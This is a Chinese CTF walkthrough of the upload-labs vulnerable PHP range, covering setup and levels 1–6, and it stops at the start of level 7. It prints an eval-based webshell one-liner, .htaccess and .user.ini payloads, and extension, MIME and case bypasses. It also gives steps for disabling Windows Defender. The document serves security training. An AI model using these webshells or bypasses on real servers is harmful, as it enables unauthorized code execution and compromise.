# upload-labs 靶场通关笔记

> **说明**：本文面向**授权安全学习 / CTF 练习**。upload-labs 是故意存在漏洞的教学靶场，仅可在本地或授权环境中使用。请勿将相关技术用于未授权系统。

***

## 1. 概述

**upload-labs** 是由 [c0ny1](https://github.com/c0ny1/upload-labs) 维护的 PHP 文件上传漏洞练习靶场，汇总渗透测试与 CTF 中常见的上传绕过手法，目前常见版本约 **20～21 关**。

| 项目 | 说明 |
| --- | --- |
| 项目地址 | <https://github.com/c0ny1/upload-labs> |
| 语言 | PHP |
| 目标 | 系统练习前端校验、MIME、黑白名单、解析漏洞、图片马、竞争条件等 |
| 推荐环境 | Windows + PHP 5.2.x（部分关依赖旧特性）；或 Docker |

### 漏洞类型总览

| 关卡 | 主要考点 |
| --- | --- |
| Pass-01 | 前端 JS 校验 |
| Pass-02 | Content-Type / MIME |
| Pass-03 | 黑名单不完整（可解析后缀） |
| Pass-04 | 黑名单遗漏 `.htaccess` |
| Pass-05 | `.user.ini` + 相关绕过 |
| Pass-06 | 后缀大小写 |
| Pass-07 | 后缀空格 |
| Pass-08 | 后缀点号 |
| Pass-09 | Windows `::$DATA` |
| Pass-10 | 点 + 空格 + 点 |
| Pass-11 | 双写绕过 |
| Pass-12 | 白名单 + GET `%00` 截断 |
| Pass-13 | 白名单 + POST `%00` 截断 |
| Pass-14～16 | 图片马 / 文件头 / getimagesize 等 |
| Pass-17 | 二次渲染 |
| Pass-18～19 | 条件竞争 |
| Pass-20～21 | 综合 / 路径与后缀组合 |

> 不同镜像或 fork 关卡编号可能略有差异，以本地源码为准。

***

## 2. 环境搭建

### 2.1 官方推荐配置

| 配置项 | 建议 |
| --- | --- |
| 系统 | Windows 优先（Pass-19 等部分题更适合 Linux） |
| PHP | **5.2.17**（过高会导致 `%00` 等关无法复现） |
| 扩展 | `php_gd2`、`php_exif` |
| Web 服务 | Apache，**module 方式**连接 PHP（非纯 CGI 时部分解析特性不同） |

### 2.2 Docker 快速启动

```bash
docker pull c0ny1/upload-labs
docker run -d -p 8080:80 --name upload-labs c0ny1/upload-labs
```

浏览器访问：`http://127.0.0.1:8080`

若提示 upload 目录不存在：

```bash
docker exec -it upload-labs bash
mkdir -p /var/www/html/upload
chown www-data:www-data /var/www/html/upload
chmod 777 /var/www/html/upload
```

### 2.3 本地源码

```bash
git clone https://github.com/c0ny1/upload-labs.git
# 放入 phpStudy / 自建 Apache+PHP 网站目录后访问
```

Windows 也可使用项目 Release 中的集成环境包。

![1787403202970-8856c796-5d0b-4d04-bc9a-ec5376149019.png](./img/282317868/1787403202970-8856c796-5d0b-4d04-bc9a-ec5376149019-471472.png)

<font style="color:#DF2A3F;">提示：</font>如果使用 Windows 部署靶场的话，记得关闭 Windows 安全中心，不然上传 shell 会被安全中心当病毒查杀掉，导致实验失败。关闭的过程如下：

在 Windows 设置里面，打开“更新与安全”。

![1787457886475-be58e95e-8436-4357-ad37-689d688b100f.png](./img/282317868/1787457886475-be58e95e-8436-4357-ad37-689d688b100f-100807.png)

点击左侧的“Windows 安全中心”，点击中间的“打开 Windows 安全中心”。

![1787457948800-493648ca-2a99-4234-8fa5-cac41922aa06.png](./img/282317868/1787457948800-493648ca-2a99-4234-8fa5-cac41922aa06-102154.png)

点击左侧列表的“病毒和威胁防护”，在“‘病毒和威胁防护’设置”下面点击管理设置。

![1787457968214-43c589e3-bfdc-4942-bc4b-2ed26e011d33.png](./img/282317868/1787457968214-43c589e3-bfdc-4942-bc4b-2ed26e011d33-871813.png)

关闭“实时保护”按钮，即可关闭 Windows 安全中心。

![1787458052573-13402f4c-ca3e-49f2-bb72-935f262e52f9.png](./img/282317868/1787458052573-13402f4c-ca3e-49f2-bb72-935f262e52f9-244694.png)

或者使用这个开源的 defender-control 去关闭“Windows 安全中心”也可以。

<https://github.com/pgkt04/defender-control>

![1787458296603-d83831ce-824d-47af-90f1-b90056b4c395.png](./img/282317868/1787458296603-d83831ce-824d-47af-90f1-b90056b4c395-188816.png)

![1787458266034-7ad87aae-713b-4593-84f3-9604054db835.png](./img/282317868/1787458266034-7ad87aae-713b-4593-84f3-9604054db835-923976.png)

### 2.4 练习前准备

**测试用 PHP 一句话（仅用于靶场）：**

```php
<?php @eval($_POST['cmd']); ?>
```

或先验证环境：

```php
<?php phpinfo(); ?>
```

**常用工具：**

* Burp Suite / Caido 等抓包改包
* 浏览器开发者工具（禁用 JS）
* 可选：蚁剑 / 冰蝎（连接成功后的 Webshell，仅靶场）

***

## 3. 通关详解

下列为通用解题思路与源码逻辑说明。界面截图请在本地靶场自行对照；步骤按「看源码 → 找校验点 → 构造绕过 → 验证」展开。

***

![1787403304062-e9c94d0e-6305-4605-ad97-1401fc1b8447.png](./img/282317868/1787403304062-e9c94d0e-6305-4605-ad97-1401fc1b8447-799937.png)

可能会用到的图片素材

kali-1.0.png

![1787568621794-785f510e-9b13-4280-bcf2-39b9f97c608a.png](./img/282317868/1787568621794-785f510e-9b13-4280-bcf2-39b9f97c608a-775046.png)

kali-linux.png

![1787568621799-83de61d8-31cf-42cd-8e28-a5b981345a04.png](./img/282317868/1787568621799-83de61d8-31cf-42cd-8e28-a5b981345a04-111444.png)

hacker.jpg

![1787568650882-0267d27b-41ac-4b06-9a3a-d92ad49fd178.jpeg](./img/282317868/1787568650882-0267d27b-41ac-4b06-9a3a-d92ad49fd178-144144.jpeg)

GIF 图片素材：

sample-animated-400x300.gif

![1787568593875-1f88a34f-634b-4c9a-96b7-6208aa797c7b.gif](./img/282317868/1787568593875-1f88a34f-634b-4c9a-96b7-6208aa797c7b-609239.gif)

### Pass-01：前端 JS 校验

**考点**：仅浏览器端校验后缀，服务端未校验。

**原理**：前端校验可被用户完全控制，不能作为安全边界。

**源码逻辑（典型）：**

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

表单 `onsubmit` 调用 `checkFile()`，拦截非法后缀。

这一关的验证**只有前端 JavaScript**，没有任何后端检查。源码里写得很清楚：

```plain
var allow_ext = ".jpg|.png|.gif";
var ext_name = file.substring(file.lastIndexOf("."));
if (allow_ext.indexOf(ext_name + "|") == -1) {
    // 不允许上传
}
```

所以只要绕过前端的这个检查即可。

**绕过步骤：**

1. **禁用 JS**：F12 → 设置 → 禁用 JavaScript，直接上传 `shell.php`

![1787404354915-6665fa2d-944d-45a3-801f-dab55dc85930.png](./img/282317868/1787404354915-6665fa2d-944d-45a3-801f-dab55dc85930-874842.png)

这里打勾，之后不要关闭开发者工具。

![1787404390156-9c2f3780-bca4-4abd-b4af-b9d497c9cacf.png](./img/282317868/1787404390156-9c2f3780-bca4-4abd-b4af-b9d497c9cacf-968458.png)

上传 php 一句话木马\
![1787404474864-84de7db9-1104-4410-8f54-121ba82e6411.png](./img/282317868/1787404474864-84de7db9-1104-4410-8f54-121ba82e6411-857980.png)

复制图片链接并打开。

![1787404498978-a57ee995-761a-4edc-b9bc-b6b06419a62a.png](./img/282317868/1787404498978-a57ee995-761a-4edc-b9bc-b6b06419a62a-260622.png)

出现这个说明成功

![1787404542889-48f314b1-5d52-49e9-9180-29c74cb65cc4.png](./img/282317868/1787404542889-48f314b1-5d52-49e9-9180-29c74cb65cc4-381585.png)

可连接中国蚁剑。

![1787458696339-ee5984d4-b1a3-4426-a5c4-9585e54a11c4.png](./img/282317868/1787458696339-ee5984d4-b1a3-4426-a5c4-9585e54a11c4-582753.png)

![1787458657493-12255a9e-f178-4de7-a99e-3688bb7f9249.png](./img/282317868/1787458657493-12255a9e-f178-4de7-a99e-3688bb7f9249-400605.png)

2. **改页面逻辑**：改写 `onsubmit="return checkFile()"`

在获知源码的情况下，可以直接函数名顶替直接在控制台输入js

```php
function checkFile() {}
```

![1787459351135-9de6d2e8-59ad-47f3-8ea6-5d9853865d1e.png](./img/282317868/1787459351135-9de6d2e8-59ad-47f3-8ea6-5d9853865d1e-626226.png)

上传成功。

![1787459367115-2497a91a-ff57-414d-858a-151ec366babd.png](./img/282317868/1787459367115-2497a91a-ff57-414d-858a-151ec366babd-980002.png)

或者我们把js复制下来，打开浏览器控制台，并回车，直接重置checkFile()这个同名函数，使js执行俩次。

右键，查看网站源代码

![1787460132983-ea6bbeba-1134-4357-9256-b5eac2d443a5.png](./img/282317868/1787460132983-ea6bbeba-1134-4357-9256-b5eac2d443a5-019481.png)

复制 js 代码。

![1787461584452-8237d421-ac7b-4591-bc43-dd562d0130b3.png](./img/282317868/1787461584452-8237d421-ac7b-4591-bc43-dd562d0130b3-165292.png)

把代码粘贴到控制台，把 return 从原来的 flase 修改为 true，并回车。

![1787461747023-e3d00f5e-2997-49cc-a341-32d8334ff49b.png](./img/282317868/1787461747023-e3d00f5e-2997-49cc-a341-32d8334ff49b-351000.png)

<font style="color:rgb(37, 41, 51);">上传成功。</font>

![1787461816557-d3f7e633-774d-402f-8a56-08377a5e9442.png](./img/282317868/1787461816557-d3f7e633-774d-402f-8a56-08377a5e9442-319095.png)

3. 将网站源码复制下来，放到本地，然后将js代码删除。

右键，查看网站源代码

![1787460132983-ea6bbeba-1134-4357-9256-b5eac2d443a5.png](./img/282317868/1787460132983-ea6bbeba-1134-4357-9256-b5eac2d443a5-019481.png)

全部复制

![1787460159398-00b70d7e-f066-4329-8635-1042d07d2754.png](./img/282317868/1787460159398-00b70d7e-f066-4329-8635-1042d07d2754-280329.png)

创建一个记事本，将代码放进去，把记事本后缀名改为.html

```php
notepad temp.html
```

![1787460239092-4169f4eb-ffac-4095-8f8e-d0ef3861dfe2.png](./img/282317868/1787460239092-4169f4eb-ffac-4095-8f8e-d0ef3861dfe2-668689.png)

找到 js 代码，删除，然后保存并退出。

![1787460316775-dc834d2e-3d58-40f8-814f-f4626b388500.png](./img/282317868/1787460316775-dc834d2e-3d58-40f8-814f-f4626b388500-875234.png)

如果我们打开，是有上传文件的界面，但是不知道要上传给谁。

![1787460407704-04609dab-42f0-4d54-9efd-8f0f3b5eed13.png](./img/282317868/1787460407704-04609dab-42f0-4d54-9efd-8f0f3b5eed13-486692.png)

这时我们返回到最开始，通过按 F12 键去打开开发者工具，点击网络选项栏，然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。

![1787460551453-6c4894c7-541a-4f3b-91f6-dedc3d425536.png](./img/282317868/1787460551453-6c4894c7-541a-4f3b-91f6-dedc3d425536-127776.png)

然后我们再用 Notepad 打开我们自己的html文件，修改action,这个action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。

![1787460700659-aa5180fb-3f69-4d8e-a983-0361f53dbcb6.png](./img/282317868/1787460700659-aa5180fb-3f69-4d8e-a983-0361f53dbcb6-931084.png)

最后用浏览器打开我们的 html 文件，上传。php文件即可。建议学会用这种方法，在实战中，可能会遇到很多限制条件，第三种方法才是最完美的。

![1787460756564-8c92eafd-3b54-4827-8823-b3b011afe56b.png](./img/282317868/1787460756564-8c92eafd-3b54-4827-8823-b3b011afe56b-084838.png)

上传完会自动跳转到这个页面，正常的。复制图片链接地址，就可以看到 php 的页面了。

![1787460768502-f6385a92-21e8-40e9-aa3f-097841612387.png](./img/282317868/1787460768502-f6385a92-21e8-40e9-aa3f-097841612387-502806.png)

![1787460856318-2a60ef84-3151-45a4-95f4-dced3dc215f0.png](./img/282317868/1787460856318-2a60ef84-3151-45a4-95f4-dced3dc215f0-665742.png)

4. **抓包改后缀**（推荐）：先选 `phpinfo.jpg` 上传，Burp 拦截后把文件名改为 `phpinfo.php`

通过 cmd，复制一份 phpinfo.php 并命名为 phpinfo.jpg 文件。

```php
copy phpinfo.php phpinfo.jpg
```

![1787461113026-e7fd403c-9702-443f-a8ed-6eb120e5584c.png](./img/282317868/1787461113026-e7fd403c-9702-443f-a8ed-6eb120e5584c-471564.png)

![1787461210728-e0b28957-e07c-4e7c-9561-1118ae88510a.png](./img/282317868/1787461210728-e0b28957-e07c-4e7c-9561-1118ae88510a-789245.png)

![1787461362386-883712a7-845b-44d0-a977-66f8c3896805.png](./img/282317868/1787461362386-883712a7-845b-44d0-a977-66f8c3896805-700832.png)

***

### Pass-02：MIME（Content-Type）校验

**考点**：服务端检查 `$_FILES['upload_file']['type']`。

**原理**：`type` 来自客户端 multipart 头，可伪造。

**源码逻辑（典型）：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```

这一关检查的是 **MIME 类型**（$\_FILES\['upload_file']\['type']）：

```plain
if (($_FILES['upload_file']['type'] == 'image/jpeg') || 
    ($_FILES['upload_file']['type'] == 'image/png') || 
    ($_FILES['upload_file']['type'] == 'image/gif'))
```

$\_FILES\['xxx']\['type'] 的值来自客户端请求里的 Content-Type，是可以伪造的。

**绕过步骤：**

1. 上传 `shell.php`（或先 `.jpg` 再改名）
2. Burp 拦截，将：

```http
Content-Type: application/octet-stream
```

改为：

```http
Content-Type: image/jpeg
或
Content-Type: image/png
或
Content-Type: image/gif
```

3. 放行，访问上传路径验证

![1787462306277-4403506e-f282-45e8-9f0d-e207610fb749.png](./img/282317868/1787462306277-4403506e-f282-45e8-9f0d-e207610fb749-815812.png)

![1787462406159-d1fe345e-ab42-465b-be16-b397da7c5218.png](./img/282317868/1787462406159-d1fe345e-ab42-465b-be16-b397da7c5218-798443.png)

***

### Pass-03：黑名单不完整（可解析后缀）

前提：要在 apache 的 httpd.conf 中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析 php5 代码的，访问的时候就是一个空白页

配置过程：以phpstudy为例\
1.打开其他选项单

2.打开配置文件---打开 httpd.conf

![1787463560579-b1165c1a-9916-42d9-af39-6f81debe0ffe.png](./img/282317868/1787463560579-b1165c1a-9916-42d9-af39-6f81debe0ffe-108213.png)

3.通过按 Ctrl+F 查找“AddType”，修改代码，去掉注释符#

![1787463493216-5d064e15-11ea-4c9f-a639-dfa7f4eb8e93.png](./img/282317868/1787463493216-5d064e15-11ea-4c9f-a639-dfa7f4eb8e93-924055.png)

4.保存，重启phpstudy就可以了

**考点**：禁止 `.php` 等，但未覆盖 Apache 仍可能当 PHP 解析的后缀。

**原理**：黑名单难以穷尽；解析行为取决于 Apache/PHP 配置。

**源码逻辑（典型）：**

```http
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关使用的是**黑名单**验证：

```plain
$deny_ext = array('.asp','.aspx','.php','.jsp');
```

并且做了以下处理：

* 删除末尾的点（deldot）
* 转小写
* 去除 ::$DATA
* 去空格

所以常见的大小写绕过、末尾点、Windows ADS（::$DATA）都已经被防住了。

**常见可尝试后缀：**

`.php3` `.php4` `.php5` `.phtml` `.pht` `.phps` 等（依赖服务器配置）

常用可绕过的后缀（按成功率排序）：

| 后缀 | 说明 | 推荐程度 |
| --- | --- | --- |
| `.phtml` | 很多环境可解析 | ★★★★★ |
| `.php5` | PHP 常见解析后缀 | ★★★★☆ |
| `.php3` | 老环境可能支持 | ★★★☆☆ |
| `.pht` | 部分环境支持 | ★★★☆☆ |
| `.phps` | 有时有效 | ★★☆☆☆ |

**步骤：**

1. 将 webshell 存为 `shell.phtml` 或 `shell.php5`
2. 上传，若页面回显新文件名（可能重命名），记下路径并访问

![1787462800075-8b4efc39-a598-4dbc-97c6-7d21db008a60.png](./img/282317868/1787462800075-8b4efc39-a598-4dbc-97c6-7d21db008a60-958475.png)

![1787462831658-d63b2862-409f-4a01-9da7-4169cdc92243.png](./img/282317868/1787462831658-d63b2862-409f-4a01-9da7-4169cdc92243-315963.png)

![1787462857942-dd0f3bbd-77e9-4a83-b60c-ee6ca64aa471.png](./img/282317868/1787462857942-dd0f3bbd-77e9-4a83-b60c-ee6ca64aa471-009757.png)

![1787463111993-ef6ce56d-e2b5-4540-bc6b-fd297e7ab3f1.png](./img/282317868/1787463111993-ef6ce56d-e2b5-4540-bc6b-fd297e7ab3f1-222592.png)

***

### Pass-04：黑名单遗漏 `.htaccess`

**考点**：后缀黑名单较全，但未禁 `.htaccess`。

**条件**：Apache 允许目录内 `.htaccess` 覆盖、且未禁用 `AllowOverride`。

去改 phpstudy 配置文件，其他选项菜单，打开配置文件httpd.conf

![1787463560579-b1165c1a-9916-42d9-af39-6f81debe0ffe.png](./img/282317868/1787463560579-b1165c1a-9916-42d9-af39-6f81debe0ffe-220442.webp)

查找“AllowOverride”，AllowOverride none 修改为AllowOverride all，重启phpstudy。

![1787464205461-e04179c9-def9-4cd9-a6cd-1857dd04ea7e.png](./img/282317868/1787464205461-e04179c9-def9-4cd9-a6cd-1857dd04ea7e-002507.png)

**防御提示**：禁止上传 `.htaccess`，上传目录关闭脚本执行与 Override。

**源码逻辑（典型）：**

```http
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关黑名单明显加强了，几乎把常见的 PHP、ASP、JSP 后缀都写进去了，并且做了：

* 转小写
* 删除末尾点
* 去除 ::$DATA

所以第三关用的 .phtml、.php5、.pht 等已经全部被禁。

**步骤：**

1. 上传文件名为 `.htaccess`，内容示例：

```plain
SetHandler application/x-httpd-php
```

![1787464447390-edc3dd5c-e476-4f98-9119-1f5f939ef4a5.png](./img/282317868/1787464447390-edc3dd5c-e476-4f98-9119-1f5f939ef4a5-489073.png)

![1787464477314-f1fafd6f-0753-4235-9fe0-e56d16404d90.png](./img/282317868/1787464477314-f1fafd6f-0753-4235-9fe0-e56d16404d90-184956.png)

或只让某个文件走 PHP：

```plain
<FilesMatch "phpinfo.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

2. 再上传 `phpinfo.jpg`（内容为 PHP 代码）

![1787464497489-21907f80-2da2-4868-ab22-51f4704ed367.png](./img/282317868/1787464497489-21907f80-2da2-4868-ab22-51f4704ed367-811598.png)

![1787464539054-7df6bc17-b630-411d-bcad-2cb6c843368d.png](./img/282317868/1787464539054-7df6bc17-b630-411d-bcad-2cb6c843368d-610689.png)

3. 访问 `shell.jpg`，若被按 PHP 执行则成功

![1787464579940-b39b0011-439b-4e05-9a86-47d85ba06789.png](./img/282317868/1787464579940-b39b0011-439b-4e05-9a86-47d85ba06789-016028.png)

![1787464673203-27eee735-76ae-48db-af74-7f277ddb6be0.png](./img/282317868/1787464673203-27eee735-76ae-48db-af74-7f277ddb6be0-047313.png)

***

### Pass-05：`.user.ini` 等

**考点**：在 FastCGI 等模式下，`.user.ini` 可指定 `auto_prepend_file` 等。

**条件**：PHP 以 CGI/FastCGI 运行；目录可写；存在会被解析的 PHP 入口。

**源码逻辑（典型）：**

```plain
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关的核心区别是：

* **有 \*\*\*\*strtolower()**（大小写绕过失效）
* 黑名单里已经加了 .htaccess
* 文件保存时使用的是**原始文件名**（$file_name），没有重命名成随机名

```plain
$img_path = UPLOAD_PATH.'/'.$file_name;
```

**典型利用（需环境支持）：**

<font style="color:#DF2A3F;">注意：这里使用的 php 版本是 7 的版本，比较新一点。php5 老版本无法完成这个漏洞复现。</font>

1. 上传 `.user.ini`：

```properties
auto_prepend_file=phpinfo.jpg
```

![1787473784455-d72c4c56-fc7b-4905-8084-cd0d024edd88.png](./img/282317868/1787473784455-d72c4c56-fc7b-4905-8084-cd0d024edd88-746135.png)

![1787473771122-27d40fa4-0546-4e51-90e6-9404aa7ec4eb.png](./img/282317868/1787473771122-27d40fa4-0546-4e51-90e6-9404aa7ec4eb-374280.png)

![1787473836023-9d460dd8-3b60-493e-afd5-d15e4350bd1b.png](./img/282317868/1787473836023-9d460dd8-3b60-493e-afd5-d15e4350bd1b-474962.png)

2. 上传 `phpinfo.jpg`（含 PHP 一句话）

![1787473876288-a18d831b-6f46-40db-8ebe-87e262c140d9.png](./img/282317868/1787473876288-a18d831b-6f46-40db-8ebe-87e262c140d9-015283.png)

<font style="color:rgb(51, 51, 51);">user_ini文件受到user_ini.cache_ttl这个参数影响，这里有两个选择：</font>

* <font style="color:rgb(51, 51, 51);">慢慢的等候5分钟，再去访问</font>
* <font style="color:rgb(51, 51, 51);">直接进去修改php-ini配置文件</font>

![1787475305541-114c2407-4eb3-4aa6-94e6-583f61a41658.png](./img/282317868/1787475305541-114c2407-4eb3-4aa6-94e6-583f61a41658-440044.png)

<font style="color:rgb(51, 51, 51);">把这里的300秒(即默认等5分钟)改为10：</font>

![1787475355153-94ec1afb-2ec1-451e-bc7b-51b3fa5586a7.png](./img/282317868/1787475355153-94ec1afb-2ec1-451e-bc7b-51b3fa5586a7-442948.png)

<font style="color:rgb(51, 51, 51);">修改后保存php.ini文件并重启服务，静心等候10秒后再进行下一步操作。</font>

3. 访问同目录下任意可执行的 PHP 文件，根据关卡5的提示，upload目录中存在一个readme.php,如下图所示 ，可能自动包含 `phpinfo.jpg`

![1787473971214-d90ebaed-59b4-4cd2-8911-bc4271048d65.png](./img/282317868/1787473971214-d90ebaed-59b4-4cd2-8911-bc4271048d65-718847.png)

![1787474393667-c9311a9b-90cb-4b45-b340-f6614a39f55e.png](./img/282317868/1787474393667-c9311a9b-90cb-4b45-b340-f6614a39f55e-098185.png)

readme.php 默认文件显示的是这样子的。![1787474168460-31a531c6-0e01-4675-b2ac-4d1763c031bf.png](./img/282317868/1787474168460-31a531c6-0e01-4675-b2ac-4d1763c031bf-745870.png)

php5 老版本的话会出现乱码，可以使用 Charset 插件去修改编码格式，php7 新版本的则不需要。

![1787475818331-1aab6fc2-4a9d-45dc-8002-534194c2f8fd.png](./img/282317868/1787475818331-1aab6fc2-4a9d-45dc-8002-534194c2f8fd-996967.png)

Charset 扩展插件下载：<https://chromewebstore.google.com/detail/charset/oenllhgkiiljibhfagbfogdbchhdchml>

![1787474290749-7e54342a-8813-472d-b76a-99dc6f846430.png](./img/282317868/1787474290749-7e54342a-8813-472d-b76a-99dc6f846430-345825.png)

第二种方法就是给 php 后面加“. .”（点，空格，点）即可绕过。

![1787476388810-797b30ac-b4ba-447b-8755-84b5bf6e477c.png](./img/282317868/1787476388810-797b30ac-b4ba-447b-8755-84b5bf6e477c-699591.png)

![1787476425661-ed3ff872-faa2-41fd-915a-bf326fd19cc3.png](./img/282317868/1787476425661-ed3ff872-faa2-41fd-915a-bf326fd19cc3-341299.png)

也可配合大小写等绕过（见后几关思路）。

***

### Pass-06：大小写绕过

**考点**：黑名单只写了小写 `.php`，未 `strtolower`。

**源码逻辑（典型）：**

```plain
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

**源码对比：**

```php
// 有漏洞：直接比较
if (in_array($file_ext, $deny_ext)) { ... }

// 更稳妥：
$file_ext = strtolower($file_ext);
```

对比第四关，这一关最大的变化是：

**去掉了 strtolower()**。

```plain
// 第四关有这句，第六关没有了
// $file_ext = strtolower($file_ext);
```

黑名单里虽然写了一些大小写混合的后缀（如 .pHp、.pHp5 等），但 in_array() 默认是**大小写敏感**的，所以并没有完全覆盖所有组合。

**绕过方法**：后缀大小写绕过

直接把文件名改成大小写混合即可，例如：

* shell.PhP
* shell.pHp
* shell.PHP
* shell.Php
* shell.pHP

推荐优先使用：

```plain
shell.PhP
```

或

```plain
shell.pHp
```

**步骤：** 上传 `shell.Php` / `shell.pHp` / `shell.PHP`

1. 将 webshell 命名为 shell.PhP（或上面任意一种大小写组合）。
2. 直接上传（不需要改 Content-Type）。
3. 上传成功后访问返回的路径即可。

![1787467857590-f9a2a3aa-5553-4880-b90c-ccf329c670bf.png](./img/282317868/1787467857590-f9a2a3aa-5553-4880-b90c-ccf329c670bf-302462.png)

![1787467867541-0ce2952f-6c00-4c23-8635-eddd08552186.png](./img/282317868/1787467867541-0ce2952f-6c00-4c23-8635-eddd08552186-175588.png)

![1787467891599-73bba141-0cbc-42d6-acf1-fab90c663010.png](./img/282317868/1787467891599-73bba141-0cbc-42d6-acf1-fab90c663010-263578.png)

![1787468134028-fe33d28c-ffa8-4a88-a114-5f9bf1fe497a.png](./img/282317868/1787468134028-fe33d28c-ffa8-4a88-a114-5f9bf1fe497a-475047.png)

***

### Pass-07：空格绕过（Windows）

**考点**：后缀后加空格，校验看 `php `，落盘时 Windows 可能去掉尾部空格变成 `.php`。

**源码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
